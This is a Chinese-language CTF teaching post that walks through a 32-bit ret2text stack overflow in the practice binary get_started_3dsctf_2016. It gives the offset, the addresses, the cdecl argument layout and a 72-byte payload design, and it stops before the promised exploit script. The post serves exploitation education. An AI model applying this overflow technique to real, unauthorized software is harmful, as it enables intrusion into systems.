---
title: "Pwn 入门：get_started_3dsctf_2016——32 位栈传参、cdecl 与用 exit 收尾"
date: 2026-11-10 10:00:00
updated: 2026-11-10 10:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ret2text
  - 32位
  - cdecl
  - pwntools
  - gdb
  - pwndbg
  - 3dsctf2016
description: 从 64 位切到 32 位的第一道 ret2text：用 file / checksec 判断位数和静态链接，在 IDA 里看懂 sub esp,0x3c 与 56 字节偏移，按 cdecl 规则把 get_flag 的两个参数摆到栈上，讲清楚 [esp+0x10] / [esp+0x14] 的来历、为什么必须再返回到 exit，最后用 gdb 的 telescope 亲眼确认栈布局。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 4
permalink: 2026/11/10/pwn-ctf-get-started-3dsctf-2016/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（做完 64 位的 [rip](/2026/11/02/pwn-ctf-rip/)、[warmup](/2026/11/05/pwn-ctf-warmup-csaw-2016/)、[n_1](/2026/11/06/pwn-ctf-ciscn-2019-n-1/) 之后，正好用来切换 32 位思维）
- **考点**：32 位 cdecl 栈传参、`gets` 栈溢出、ret2text、给利用函数“喂”参数、用 `exit` 冲刷 stdio 缓冲区
- **工具**：`file`、`checksec`、IDA、gdb + pwndbg、`objdump`、pwntools
- **漏洞点**：`gets(v4)`，`v4` 在 `esp+4`
- **偏移**：`0x3c - 0x4 = 0x38 = 56`（这里**没有**保存的 ebp 要跳过）
- **后门**：`get_flag`，地址 `0x080489a0`，要求 `a1 == 0x308cd64f`、`a2 == 0x195719d1`
- **收尾函数**：`exit`，地址 `0x0804e6a0`
- **payload**：`56` 字节填充 + `get_flag` + `exit` + `a1` + `a2`，共 `72` 字节
- **flag**：`CTF2{a0362927-62a8-4384-bd6f-4c9caa2f9feb}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：C 语言函数调用、栈的基本概念、会用 gdb 和 pwntools（前三篇都讲过）
- **环境**：Linux（Kali / Ubuntu），IDA、gdb + pwndbg、pwntools
- **靶场**：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`file 看类型` → `checksec 看保护` → `IDA 看 main / get_flag` → `对着汇编确认偏移` → `理清 32 位的传参顺序` → `找 exit` → `写 exp` → `gdb 验证栈布局` → `打远程拿 flag`
{% endnote %}

## 从 64 位切到 32 位

前面三道题都是 64 位，这一道开始换口味。

现在你已经掌握了基本的做题方法，下面要开始丰富知识面。这道题最重要的考点是**32 位 Linux 下函数传参的方式**——它和我们之前在 64 位里用的寄存器传参完全不一样。除此之外，它还会逼你第一次认真处理“利用函数执行完之后返回到哪里”这个问题。

具体来看题目。下载后先 `file` 看一下：

```bash
file pwn5
```

![file 查看文件类型](image.png)

*图 1：`file` 的输出，`32-bit`、`Intel 80386`、`statically linked` 三个词最关键*

```text
pwn5: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.32, not stripped
```

逐段拆开看：

| 字段 | 含义 | 对做题的影响 |
| --- | --- | --- |
| `ELF 32-bit` | 32 位可执行文件 | 地址占 4 字节，exp 里用 `p32` |
| `LSB` | 小端序 | 低字节放低地址，打包时不用手动反序 |
| `Intel 80386` | i386 架构 | 参数走栈，寄存器是 `eax` / `esp` 这一套 |
| `statically linked` | **静态链接** | libc 的代码被链接进程序，函数地址固定，`exit` 这种符号能直接找到 |
| `for GNU/Linux 2.6.32` | 老内核 | 老题常见的历史痕迹，不影响做题 |
| `not stripped` | 符号表还在 | gdb 里能直接 `disas main`、`b get_flag` |

### 静态链接意味着什么

这道题在 `file` 阶段就送了我们一份大礼：**静态链接**。

平时做的题大多是 `dynamically linked`，libc 在运行时才加载，程序里只有 `system@plt` 这种跳板。静态链接则相反，链接器把 libc 里用到的函数**直接复制**进可执行文件，程序跑起来不再依赖外部 `.so`。

这带来三个很实际的区别：

| 方面 | 动态链接 | 静态链接（本题） |
| --- | --- | --- |
| libc 位置 | 运行时由动态链接器加载 | 就在程序自己的代码段里 |
| 函数地址 | 每次运行随机（ASLR） | 写在文件里，No PIE 下固定不变 |
| 调用方式 | 经 PLT/GOT 跳转 | `call` 直接到函数 |
| 找 `system` / `exit` | 一般要 `libc-database` 或泄露 | `objdump` / `nm` 直接查 |

所以这题不需要泄露 libc，也不需要处理 `exit@plt`——`exit` 的地址 `0x0804e6a0` 是写死的，`call 804e6a0 <exit>` 直接就能调用。

{% note info %}
**静态链接的代价是文件大。** 一个 hello world 静态链接后可能有好几 MB，因为 libc 里用到的代码都被复制进去了。CTF 里看到几 MB 的 32 位 ELF，第一反应就该是“静态链接”。
{% endnote %}

## checksec 查看保护

```bash
checksec --file=pwn5
```

![checksec 查看保护](image-1.png)

*图 2：`checksec` 的输出*

```text
[*] '/home/kali/ctf/pwn5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    Stripped: No
```

| 字段 | 本例 | 一句话解释 |
| --- | --- | --- |
| `Arch` | `i386-32-little` | 32 位小端序，用 `p32` |
| `RELRO` | `Partial RELRO` | GOT 只读了一部分，这题用不上 |
| `Stack` | `No canary found` | 没有金丝雀，可以直接覆盖返回地址 |
| `NX` | `NX enabled` | 栈不可执行，不能往栈上写 shellcode |
| `PIE` | `No PIE (0x8048000)` | 程序基址固定，函数地址可以写死 |
| `Stripped` | `No` | 符号表还在，gdb 里能直接用函数名 |

**No canary + No PIE**，看来可以放心用之前学过的栈溢出漏洞了。NX 开着也无所谓，我们走的是 ret2text：跳程序自己代码段里现成的函数，不执行栈上的东西。

`0x8048000` 是 32 位 Linux 可执行文件的经典基址，看到这个数基本就能确认是 32 位。

## 先补一节：32 位和 64 位到底差在哪

题目还没开始做，先把最容易混的地方讲清楚，不然后面看汇编会一直别扭。

### 不是“AMD 还是 cdecl”

先纠正一个说法：**AMD 不是一种调用约定**。`AMD64` 是 64 位 x86 架构的名字（也叫 x86-64），它用的调用约定叫 **System V AMD64 ABI**；32 位 x86 在 Linux 上默认用的叫 **cdecl**，它是 i386 System V ABI 的一部分。

所以正确的对比是：

| | 32 位 i386（cdecl） | 64 位 x86-64（System V AMD64） |
| --- | --- | --- |
| 参数放哪 | **全部走栈** | 前 6 个走寄存器：`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`，第 7 个起走栈 |
| 压栈顺序 | **从右往左**压 | 寄存器按从左到右填 |
| 返回值 | `eax`（`long long` 这类更宽的值用 `edx:eax`） | `rax` |
| 谁来清理参数 | **调用者**（caller） | 调用者 |
| 地址宽度 | 4 字节，用 `p32` | 8 字节，用 `p64` |
| 栈上一个单元 | 4 字节 | 8 字节 |
| 寄存器长相 | `eax`、`ebx`、`esp`、`eip` | `rax`、`rbx`、`rsp`、`rip` |

举个小例子。C 里写：

```c
foo(1, 2);
```

32 位 cdecl 编译出来大致是：

```asm
push 2          ; 先压第二个参数
push 1          ; 再压第一个参数
call foo        ; call 自己把返回地址压栈
add  esp, 8     ; 调用者负责把两个参数弹掉
```

`call` 执行完，栈从高地址到低地址是：

```text
高地址
        +------------+
        |  参数 2     |
        +------------+
        |  参数 1     |
        +------------+
        |  返回地址   |  ← esp 指向这里
        +------------+
低地址
```

从低往高读，顺序就是 `[返回地址][参数 1][参数 2]`，这正是后面 payload 要摆出来的形状。**记住这个顺序：返回地址在前，参数 1 在后，参数 2 再后。**

### 怎么快速判断是哪种

三个信号，任意一个都够用：

1. **`file` / IDA 的架构**：`32-bit` / `i386` 是 32 位，`64-bit` / `x86-64` 是 64 位；
2. **寄存器名**：`eax`、`esp`、`edi` 是 32 位；`rax`、`rsp`、`rdi` 是 64 位；
3. **IDA 伪代码的函数签名**：这题显示 `int __cdecl main(...)`，`__cdecl` 就是明示。

另外，64 位的 IDA 伪代码经常写成 `__fastcall`，别被这个名字骗了——Linux 64 位用的仍然是 System V AMD64 ABI，参数走寄存器，只是 IDA 借用了 `__fastcall` 这个关键字来表示“寄存器传参”。

### 哪些寄存器会被函数改掉

32 位 i386 把通用寄存器分成两类：

| 类别 | 寄存器 | 规则 |
| --- | --- | --- |
| caller-saved | `eax`、`ecx`、`edx` | 被调函数可以随便改，调用者自己要保存 |
| callee-saved | `ebx`、`esi`、`edi`、`ebp` | 被调函数**必须**原样还回去 |

这就是后面 `get_flag` 开头 `push esi` 的原因：它要用 `esi` 存 `fopen` 返回的 `FILE *`，而 `esi` 是 callee-saved，所以进门先保存、出门再 `pop` 回来。

### 先认识一下 glibc

后面会反复提到 glibc，这里先把它说清楚。

**glibc（GNU C Library）是 Linux 上最常用的 C 标准库实现。** 你在 C 里直接调用的那些函数——`printf`、`gets`、`fopen`、`getc`、`putchar`、`system`、`exit`、`malloc`——绝大多数都是它提供的，既不是编译器内置的，也不是内核提供的。

它主要干三件事：

| 职责 | 例子 |
| --- | --- |
| C 标准库函数 | `printf`、`malloc`、`strlen` |
| 系统调用封装 | `open`、`read`、`write`、`exit_group` |
| 程序启动与收尾 | `_start` 调 `__libc_start_main`，最终调 `main` 和 `exit` |

glibc 自己跑在**用户态**。比如 `fopen` 打开文件，内部最终要执行 `open` 系统调用；32 位通常走 `int 0x80`，64 位走 `syscall`。所以严格说，`fopen` 是“C 库函数”，`open` 才是“系统调用”。我们说 `system` 不是系统函数，也是这个意思——它是 glibc 里的一个普通函数，只是内部会 `fork` + `execve` 去起 shell。

链接方式决定它在哪：

| 方式 | glibc 在哪 | 做题时怎么找函数地址 |
| --- | --- | --- |
| 动态链接 | 运行时由 `ld.so` 加载 `libc.so.6` | 先泄露 libc 基址，再查 `libc-database` |
| 静态链接（本题） | 用到的代码被链接进 `pwn5` | `objdump` / `nm` 直接查，地址固定 |

这题 `file` 显示 `statically linked`，所以 `exit`、`fopen` 的代码就在程序里，`objdump` 能看到 `<exit>`、`<fopen>` 这样的符号，也不用做 libc 泄露。后面讲 `ret2libc` 时说的“libc”，指的就是这个库。

### 栈对齐到底在解决什么问题

栈对齐不是“栈看起来整齐”，而是**某些 CPU 指令的硬性要求**。

SSE 指令 `movaps`、`movdqa` 在读写 16 字节对齐的内存时最快，但操作数地址不是 16 的倍数时，CPU 会直接抛 `#GP`，进程收到 `SIGSEGV`。编译器想用这些指令，就必须知道“栈上的某个位置一定是 16 字节对齐的”。这个保证来自调用约定：

- 只要每个函数都按约定进入、按约定调用下一个函数，编译器就能算出局部变量和传参区的对齐；
- 一旦有人不按约定来（比如我们用 `ret` 跳进函数），被调函数里的 `movaps` 就可能踩到不对齐的地址。

所以“要不要做栈对齐”的本质是：**你跳过去的这段代码，有没有依赖 16 字节对齐的 SSE 指令，以及它依赖的约定你有没有破坏。**

### 64 位为什么几乎一定要对齐

64 位 System V AMD64 ABI 规定：

> 执行 `call` 的那一刻，`rsp % 16 == 0`。

`call` 压 8 字节返回地址，所以被调函数刚进门时 `rsp % 16 == 8`；函数序言再 `push rbp`，又回到 0，之后它 `call` 别人时仍然对齐。

如果我们是 `ret` 进去的，进门时 `rsp % 16 == 0`（`ret` 弹了 8 字节，但没有像 `call` 那样压返回地址），比正常入口少了一个 8 字节槽。目标函数如果开头有 `push rbp`，执行完就变成 8，后面 `call system` 时栈是歪的。`system` 内部有 `movaps`，于是崩。

补法就是**返回到一个 `ret` gadget 再跳到目标**：多一次 `ret` 让 `rsp` 加 8，把正常入口的状态补回来。这是 [warmup 那篇](/2026/11/05/pwn-ctf-warmup-csaw-2016/) 里的第二种方法；第一种 `func+1` 跳过 `push rbp` 也能让“进门后”的 `rsp` 回到 0。

### 32 位为什么通常不用

32 位 i386 的 ABI 最低只保证 **4 字节对齐**：

| 层面 | 要求 |
| --- | --- |
| i386 System V ABI 最低保证 | 4 字节 |
| Linux 上 GCC 的默认行为 | 通常按 16 字节维护（`-mpreferred-stack-boundary=4`） |

GCC 自己生成的代码通常会让 `call` 前的 `esp` 是 16 的倍数，但 **32 位 glibc 不能假设所有调用者都这么做**——ABI 最低只保证 4 字节，老编译器、手写汇编、一些启动代码都可能只按 4 字节对齐。所以 32 位 glibc 里的很多函数会避免依赖“栈一定 16 字节对齐”，或者在做 SSE 操作前自己先把地址对齐。

这不是说所有 32 位代码都绝对安全，而是说：**32 位 pwn 里，栈对齐通常不是第一嫌疑人**。本题就是例子：我们用 `ret` 跳进 `get_flag`，它的入口 `esp % 16` 是 `0`，正常 `call` 进去时是 `12`，两者对不上，它内部 `call fopen` 时栈也不是 16 的倍数，但程序照样跑完了——说明这题用到的这些 libc 函数没有依赖 16 字节对齐。真要遇到依赖 SSE 对齐的 32 位代码，按下一节的办法补就行。

### 那到底什么时候要管

按“目标代码有没有用对齐 SSE”来判断，比背位数可靠：

| 场景 | 要不要管 | 原因 |
| --- | --- | --- |
| 64 位跳 `system` / `printf` / 部分 `memcpy` | **要** | ABI 强制，函数内部有 `movaps` |
| 64 位跳纯整数运算的函数 | 一般不用 | 没有对齐 SSE，但按 ABI 补一下更稳 |
| 32 位跳 glibc 函数（本题） | 通常不用 | i386 最低 4 字节，多数函数不依赖 16 字节对齐 |
| 32 位函数把 `__m128` / `double` 数组放栈上并用 SSE | **要** | 编译器会按 16 字节对齐访问 |
| 自己写 shellcode 用 `movaps` | **要** | 同上 |
| 直接 `int 0x80` / `syscall` | 不用 | 内核不检查用户栈对齐 |

实战里怎么判断？看崩溃点：

```text
pwndbg> x/i $pc
=> 0xf7... <__memcpy_ssse3+...>: movaps xmm0, [esp+0x10]
pwndbg> p/x $esp & 0xf
$1 = 0x4
```

如果崩在 `movaps` / `movdqa`，而且 `esp` 或操作数地址不是 16 的倍数，基本就是对齐问题；如果崩在 `ret` 或访问野地址，那是偏移/地址写错了，别甩锅给对齐。

### 32 位真要补，怎么补

栈上每个单元 4 字节：

| 操作 | 对 `esp` 的影响 |
| --- | --- |
| `push` | `esp -= 4` |
| `pop` | `esp += 4` |
| `call` | `esp -= 4`（压返回地址） |
| `ret` | `esp += 4`（弹返回地址） |

用 `ret` 跳进函数时，入口状态和正常 `call` 不一样（下面这张表只在目标函数确实依赖 16 字节对齐时才有意义）：

| | 正常 `call` 进入 | 用 `ret` 跳进去 | 要加多少 | 怎么补 |
| --- | --- | --- | --- | --- |
| 64 位 | `rsp % 16 == 8` | `0` | 8 | 1 个 `ret` gadget |
| 32 位 | `esp % 16 == 12` | `0` | 12 | 3 个 `ret` gadget（每个 +4） |

32 位为什么是 3 个？从 `0` 开始，每个 `ret` 让 `esp` 加 4：`0 → 4 → 8 → 12`，第三次才回到正常入口的 `12`。

注意 32 位不能直接照搬 64 位的 `func+1`：64 位里 `push rbp` 让 `rsp` 减 8，跳过它以后 `rsp` 正好等于正常执行完 `push rbp` 的状态（0）；32 位 `push` 只让 `esp` 减 4，跳过它反而让 `esp` 比执行 `push` 时多 4，离正常状态更远（差 8）。所以 32 位还是老老实实用 `ret` 数槽位。最稳的办法是在 gdb 里看目标函数 `call` 前的 `esp`，缺多少补多少。

{% note warning %}
**先别默认所有崩溃都是栈对齐。** 64 位里“地址明明对、一打就崩”经常是对齐；32 位里更常见的是偏移算错、返回地址写坏、参数顺序反了。先确认 `$pc` 停在 `movaps` 一类的指令上，再谈对齐。
{% endnote %}

## 丢进 IDA 看 main

依旧丢给 IDA 帮我们分析函数。

![函数列表](image-3.png)

*图 3：左侧函数列表，`get_flag` 就在 `main` 上面*

先看 `main`：

![main 的伪代码](image-2.png)

*图 4：`main` 的伪代码，`char v4[56]` + `gets(v4)`*

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}
```

代码短得可怜，但每一行都有信息量：

| 代码 | 作用 | 对做题的意义 |
| --- | --- | --- |
| `char v4[56]` | 56 字节缓冲区，在 `esp+4` | `gets` 的写入起点 |
| `printf(...)` | 打印提示语 | 4 字节的传出参数槽就是给它用的 |
| `gets(v4)` | 读一行，不检查长度 | 漏洞点 |
| `return 0` | 正常返回 | 返回地址可以被我们覆盖 |

`gets` 不检查长度，从 `v4` 开始一路往高地址写，超过 56 字节就会碰到返回地址。**这就是整道题的入口。**

### 注意：main 没有 push ebp

这段伪代码里 `v4` 的注释是 `[esp+4h] [ebp-38h]`，两个都出现了，看着有点乱。先看汇编：

![main 的汇编](image-6.png)

*图 5：`main` 的汇编，只有 9 条指令*

```asm
0x08048a20 <main+0>:   sub  esp, 0x3c
0x08048a23 <main+3>:   mov  DWORD PTR [esp], 0x80bc391   ; "Qual a palavrinha magica? "
0x08048a2a <main+10>:  call 0x804f0e0 <printf>
0x08048a2f <main+15>:  lea  eax, [esp+4]
0x08048a33 <main+19>:  mov  DWORD PTR [esp], eax
0x08048a36 <main+22>:  call 0x804f630 <gets>
0x08048a3b <main+27>:  xor  eax, eax
0x08048a3d <main+29>:  add  esp, 0x3c
0x08048a40 <main+32>:  ret
```

**没有 `push ebp`，没有 `mov ebp, esp`，也没有 `leave`。** 这个函数完全用 `esp` 寻址，编译器把帧指针省略了（`-fomit-frame-pointer`）。

所以 IDA 注释里的 `[ebp-0x38]` 只是它按标准栈帧推出来的等价位置，真正在代码里起作用的是 `[esp+4]`。别被两个注解绕进去，以汇编为准。

### 0x3c 和 56 是怎么对上的

`sub esp, 0x3c` 给这个函数留了 **60 字节**。这 60 字节不是全给 `v4` 的：

```text
高地址
        +--------------------------+
esp+0x3c|  返回地址 (4 字节)        |  ← 函数返回时 ret 弹的就是它
        +--------------------------+
esp+4   |  v4[56]                  |  ← gets 从这里开始写
        +--------------------------+
esp     |  传出参数槽 (4 字节)      |  printf / gets 的参数放在这里
        +--------------------------+
低地址
```

- `[esp]`：4 字节，是**传出参数槽**。`printf` 的格式串、`gets` 的目标地址都写在这里；
- `[esp+4]`：`v4`，56 字节，正好到 `esp+0x3c`；
- `[esp+0x3c]`：`main` 的返回地址。

为什么会这样写，而不是用 `push`？看这两组指令：

```asm
; 编译器实际生成的（预留槽位 + 直接写内存）
sub  esp, 0x3c
mov  DWORD PTR [esp], 0x80bc391
call printf

; 教材里常见的（push + 手动清理）
push 0x80bc391
call printf
add  esp, 4
```

两者在 cdecl 下是**等价**的：参数都在 `[esp]`，区别只是前者提前把空间留好、省掉 `push` / `add esp`。编译器做了这个优化，所以你会看到 `main` “开辟了 60 字节”，但其中 4 字节其实是给 `printf` 和 `gets` 传参用的。

{% note info %}
**`v4[0]` 那个参数可以忽略。** 伪代码里 `printf(...)` 后面跟了个 `v4[0]`，但汇编里只写了格式串一个参数。格式串里没有 `%` 转换符，多出来的参数本来就不会被读取，编译器干脆没生成。真正要关心的是：`[esp]` 是传出参数槽，`[esp+4]` 才是 `v4`。
{% endnote %}

### 算偏移：56

`gets` 从 `esp+4` 开始写，返回地址在 `esp+0x3c`，两者相差：

```text
0x3c - 0x4 = 0x38 = 56
```

所以前 **56 个字节是填充**，第 57 个字节开始就是 `main` 的返回地址。32 位地址占 4 字节，所以只覆盖返回地址需要 `56 + 4 = 60` 字节。

这和 64 位题的算法有个重要区别：

| | 64 位（有帧指针） | 这题（无帧指针） |
| --- | --- | --- |
| 缓冲区后面 | 保存的 `rbp`（8 字节） | **没有保存的 ebp** |
| 偏移 | 缓冲区大小 + 8 | 缓冲区大小（56） |
| 返回地址 | `rbp+8` | `esp+0x3c` |

如果 `main` 老老实实 `push ebp; mov ebp, esp`，`v4` 后面就会先隔一个 4 字节的保存 ebp，偏移会变成 60。这里编译器省掉了帧指针，`v4` 直接贴着返回地址，所以是 56。

{% note warning %}
**算偏移永远看“写入起点到返回地址”的距离，不要背公式。** 64 位题常见的 `缓冲区 + 8` 只是因为中间有个保存的 rbp；这题没有帧指针，就没有那 8 字节。拿到题先看汇编里 `lea` 算的是哪个地址、`ret` 前的 `add esp` 加了多少，再下结论。
{% endnote %}

另外，`gets` 读完输入后会自动补一个 `\0`。我们发 72 字节时，它补在 `v4+72`，已经越过了 `a2` 槽，不影响利用。

## 看 get_flag：参数、栈和返回值

`get_flag` 就在 `main` 上面：

![get_flag 的伪代码](image-4.png)

*图 6：`get_flag` 的伪代码，要两个参数都等于指定值才肯读 flag*

```c
void __cdecl get_flag(int a1, int a2)
{
  int v2;             // esi
  unsigned __int8 v3; // al
  int v4;             // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 && a2 == 425138641 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
```

发现需要让 `a1`、`a2` 分别等于 `814536271` 和 `425138641`。先转成十六进制：

```text
814536271 = 0x308CD64F
425138641 = 0x195719D1
```

| 十进制 | 十六进制 | 对应参数 |
| --- | --- | --- |
| `814536271` | `0x308CD64F` | `a1` |
| `425138641` | `0x195719D1` | `a2` |

Python 里直接 `hex(814536271)` 就能验证，不用手算。

`get_flag` 的逻辑是：两个参数都对，就打开 `flag.txt`，用 `getc` 一个字符一个字符读出来，再用 `putchar` 输出，直到读到 `EOF`（`getc` 返回 `-1`，截断成 8 位就是 `0xFF` = 255），最后 `fclose`。

注意它**没有调用 `system`**。`fopen`、`getc`、`putchar` 都是 glibc 提供的 C 库函数，不属于“起 shell”那一类。这意味着我们不是从一个 shell 里读 flag，而是让程序自己把 flag 打到标准输出上——这一点后面会决定我们必须处理返回值。

### 对着汇编确认参数位置

![get_flag 的汇编](image-5.png)

*图 7：`get_flag` 的汇编，入口地址 `0x080489a0`*

关键几行抄下来：

```asm
0x080489a0 <get_flag+0>:   push esi
0x080489a1 <get_flag+1>:   sub  esp, 0x8
0x080489a4 <get_flag+4>:   cmp  DWORD PTR [esp+0x10], 0x308cd64f
0x080489ac <get_flag+12>:  jne  0x8048a15 <get_flag+117>
0x080489ae <get_flag+14>:  cmp  DWORD PTR [esp+0x14], 0x195719d1
0x080489b6 <get_flag+22>:  jne  0x8048a15 <get_flag+117>
0x080489b8 <get_flag+24>:  mov  DWORD PTR [esp+4], 0x80cdd68   ; "rt"
0x080489c0 <get_flag+32>:  mov  DWORD PTR [esp], 0x80bc388     ; "flag.txt"
0x080489c7 <get_flag+39>:  call 0x804f610 <fopen>
...
0x08048a15 <get_flag+117>: add  esp, 0x8
0x08048a18 <get_flag+120>: pop  esi
0x08048a19 <get_flag+121>: ret
```

先看开头的两条：

```asm
push esi        ; esp -= 4，保存调用者的 esi
sub  esp, 0x8   ; esp -= 8，留两个传出参数槽
```

`push esi` 是因为 `esi` 是 callee-saved，函数要用它存 `FILE *`，必须先保存；`sub esp, 8` 是给 `fopen` 这种要两个参数（文件名 + 模式）的函数留出参数槽。两条加起来，`esp` 一共往下走了 **12 字节**。

### 为什么参数在 [esp+0x10] 和 [esp+0x14]

这是新手最容易一头雾水的地方：正常 cdecl 调用，第一个参数不是应该在 `[esp+4]` 吗？怎么跑到 `[esp+0x10]` 去了？

因为 **`esp` 在函数开头被移动过**。设函数刚进门时 `esp = E`：

```text
进门瞬间（E 指向返回地址）：
  [E]     = 返回地址
  [E+4]   = a1
  [E+8]   = a2

push esi（esp = E-4）：
  [E-4]   = 保存的 esi
  [E]     = 返回地址
  [E+4]   = a1
  [E+8]   = a2

sub esp, 8（esp = E-12）：
  [E-12]  = 传出参数槽 0
  [E-8]   = 传出参数槽 1
  [E-4]   = 保存的 esi
  [E]     = 返回地址
  [E+4]   = a1
  [E+8]   = a2
```

把 `esp = E-12` 代进去：

```text
[esp+0x00] = E-12  传出参数槽 0
[esp+0x04] = E-8   传出参数槽 1
[esp+0x08] = E-4   保存的 esi
[esp+0x0c] = E     返回地址
[esp+0x10] = E+4   a1   ← cmp 读的就是这里
[esp+0x14] = E+8   a2   ← cmp 读的就是这里
```

所以 `[esp+0x10]` / `[esp+0x14]` 不是“参数被放远了”，而是 **`esp` 自己退了 12 字节**，用 `esp` 相对寻址看，参数自然就往后挪了 12。12 = `0x0c`，所以 `[esp+0x0c]` 是返回地址，`[esp+0x10]` 正好跳过它。

画成图（函数序言执行完之后）：

```text
高地址
        +--------------------------+
esp+0x14|  a2 = 0x195719d1         |  ← cmp 检查
        +--------------------------+
esp+0x10|  a1 = 0x308cd64f         |  ← cmp 检查
        +--------------------------+
esp+0x0c|  返回地址 (4)             |  ← get_flag 执行 ret 时弹它
        +--------------------------+
esp+0x08|  保存的 esi (4)           |
        +--------------------------+
esp+0x04|  传出参数槽 1 (4)         |
        +--------------------------+
esp+0x00|  传出参数槽 0 (4)         |  ← esp 指向这里
        +--------------------------+
低地址
```

这就是“32 位传参全走栈”的具体样子：**参数不在寄存器里，就在返回地址上面的两个槽里。**

### 一个顺带的小细节

`0x080489e4` 附近有一行：

```asm
data16 data16 nop WORD PTR cs:[eax+eax*1+0x0]
```

这是编译器插入的**多字节 NOP**，只用来做指令对齐，不改变任何寄存器或内存。反汇编里看到这种一串 `data16` 不用慌，跳过就行。

还有 `cmp ecx, 0xff` 这个判断：`getc` 返回的是 `int`，`EOF` 是 `-1`；结果被截断成 8 位后就是 `0xFF`，所以循环条件是“还没读到 `0xFF`”。这是把 `int` 塞进 `char` 的典型写法。

参数不对的时候，`jne` 会跳到 `+117`：

```asm
add esp, 0x8
pop esi
ret
```

也就是把 `esp` 还原、恢复 `esi`、正常返回。它**不会崩**，只是什么都不打印。所以如果远程连上了却只看到提示语、没有 flag，先检查两个参数是不是写反了。

## 把整条利用链拼起来

现在把两段接上。

`main` 的返回地址被我们改成 `get_flag`。`main` 执行 `ret` 时：

1. 从栈顶弹出我们写的 `get_flag` 地址，`esp += 4`；
2. 跳到 `get_flag` 的第一条指令。

此时 `esp` 指向的是**下一个槽**。因为 `get_flag` 是被 `ret` 进去的，不是被 `call` 进去的，那个槽不会自动变成“`main` 里的下一条指令”——它就是我们 payload 里的内容。而这个槽，正好是 `get_flag` 将来执行 `ret` 时要弹的**返回地址**。

所以 payload 从低地址往高地址（图上从下往上）必须是：填充 → `get_flag` → `exit` → `a1` → `a2`。

```text
高地址
        +--------------------------+
        |  a2 (4)                  |  0x195719d1
        +--------------------------+
        |  a1 (4)                  |  0x308cd64f
        +--------------------------+
        |  exit (4)                |  0x0804e6a0，get_flag 的返回地址
        +--------------------------+
        |  get_flag (4)            |  0x080489a0，被 main 的 ret 弹走
        +--------------------------+
        |  v4 填充 (56 字节)        |  'A' * 56
        +--------------------------+
低地址
```

为什么 `exit` 要放在 `get_flag` 后面、参数前面？因为 32 位 cdecl 的参数在返回地址**上面**，而 `get_flag` 进门时 `[esp]` 就是返回地址：

```text
get_flag 进门瞬间：
  [esp]     = exit        ← get_flag 的 ret 会跳到这里
  [esp+4]   = a1
  [esp+8]   = a2
```

这和一个正常的 `call get_flag(a1, a2)` 摆出来的形状完全一样：

```asm
push a2
push a1
call get_flag
```

`call` 压入返回地址后，栈从低到高就是 `[返回地址][a1][a2]`。区别只在于，正常调用时返回地址是 `main` 里的下一条指令，而我们把它换成了 `exit`。

{% note info %}
**“跳到函数”和“调用函数”的区别就在这 4 个字节。** 覆盖返回地址只是把 `eip` 改了，`esp` 只是自然地加 4；函数需要的参数和它自己的返回地址，都得由我们在后面的槽位里手动摆好。64 位题里参数走寄存器，所以经常只写一个地址就完事；32 位题参数走栈，就必须把整条“假调用栈”搭出来。
{% endnote %}

## 为什么还需要一个 exit

在开始写 exp 之前还要提醒一点。

之前我们从来不管调用了利用函数之后返回到哪里，因为通常是从 `system("/bin/sh")` 拿 shell：就算程序随后崩了，shell 已经起来了，没必要多此一举。

但这次不一样。我们是要让 C 程序**把 flag 吐到标准输出**，得确保它能正常跑完、数据真的发出来。`get_flag` 输出完 flag 之后会执行 `ret`，如果那个槽里是垃圾，进程直接段错误；而 `putchar` 写出去的内容很可能还躺在 **stdio 缓冲区**里，进程一崩，缓冲区就跟着没了。

所以还得给它一个 `exit`：`exit` 会刷新所有 stdio 流，把缓冲区里的 flag 真正写出去，然后干净地结束进程。

### stdio 缓冲到底怎么回事

`putchar` 不是直接往 socket 写字节，它先写进 `stdout` 的缓冲区。刷新策略取决于 `stdout` 连的是什么：

| `stdout` 连到 | 缓冲模式 | 什么时候真正输出 |
| --- | --- | --- |
| 终端（tty） | 行缓冲 | 遇到换行或缓冲区满 |
| 管道 / socket | **全缓冲** | 缓冲区满（通常 4 KB）或 `exit` / `fflush` |

本地在终端里跑，flag 很短，遇到换行就出来了，看起来一切正常；远程通过 socket 连，flag 只有几十字节，远没到 4 KB，**不调用 `exit` 的话它就一直卡在缓冲区里**。程序再一崩，缓冲区释放，flag 就永远发不出来了。

`fclose(v2)` 只关闭了打开的 `flag.txt`，不会刷新 `stdout`，所以不能指望它。

{% note warning %}
**`exit` 和 `_exit` 不是一回事。** `exit` 会执行 `atexit` 注册的函数、刷新并关闭所有 stdio 流；`_exit` 是直接进内核退出，**不刷新缓冲区**。这题必须用 `exit`。
{% endnote %}

### 用 objdump 找 exit

因为程序是静态链接、没有 stripped，`exit` 的符号还在，直接用 `objdump` 反汇编再 `grep`：

```bash
objdump -d ./pwn5 | grep -i exit
```

![objdump 查找 exit](image-9.png)

*图 8：`objdump -d` 的输出里，`0804e6a0 <exit>:` 就是入口*

命令拆开看：

| 部分 | 含义 |
| --- | --- |
| `objdump` | GNU 的二进制分析工具 |
| `-d` | disassemble，反汇编可执行段 |
| `./pwn5` | 目标文件 |
| `\| grep -i exit` | 过滤包含 `exit` 的行，`-i` 忽略大小写 |

